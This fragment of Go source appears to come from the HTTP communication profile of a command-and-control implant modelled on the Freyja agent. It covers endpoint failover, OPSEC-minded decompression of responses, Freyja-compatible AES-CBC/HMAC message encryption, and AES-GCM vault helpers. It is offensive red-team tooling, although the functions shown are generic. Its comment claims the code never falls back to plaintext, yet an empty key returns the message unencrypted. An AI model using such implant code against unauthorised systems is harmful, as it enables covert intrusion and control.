			log.Printf("failover: switched endpoint")
		}
		return resp, nil
	}

	return nil, lastErr
}

// readResponseBody reads and decompresses the response body if needed.
// When Accept-Encoding is set explicitly (for OPSEC-realistic headers), Go's
// http.Transport does NOT auto-decompress responses. This helper transparently
// handles gzip and Brotli-compressed responses from CDNs, proxies, or load balancers.
func readResponseBody(resp *http.Response) ([]byte, error) {
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		gr, err := gzip.NewReader(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("gzip decompression failed: %w", err)
		}
		defer gr.Close()
		return io.ReadAll(gr)
	case "br":
		return io.ReadAll(brotli.NewReader(resp.Body))
	default:
		return io.ReadAll(resp.Body)
	}
}

// getString safely gets a string value from a map
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// encryptMessage encrypts a message exactly like Freyja's AesEncrypt.
// The encKey parameter is the base64-encoded AES key from the C2 profile.
// Returns an error if encryption fails — never falls back to plaintext to avoid leaking unencrypted data.
func (h *HTTPProfile) encryptMessage(msg []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return msg, nil
	}

	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("failed to generate IV: %w", err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)

	padded, err := pkcs7Pad(msg, aes.BlockSize)
	if err != nil {
		return nil, fmt.Errorf("failed to pad message: %w", err)
	}

	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	ivCiphertext := append(iv, encrypted...)

	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	hmacBytes := hmacHash.Sum(nil)

	return append(ivCiphertext, hmacBytes...), nil
}

// pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 {
		return nil, fmt.Errorf("invalid blocksize")
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
	}
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...), nil
}

// vaultEncrypt encrypts plaintext with AES-256-GCM (nonce prepended).
func vaultEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

// vaultDecrypt decrypts AES-256-GCM ciphertext with prepended nonce.
func vaultDecrypt(key, ciphertext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize+1 {
		return nil
	}
	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

// vaultZeroBytes overwrites a byte slice with zeros.
func vaultZeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}
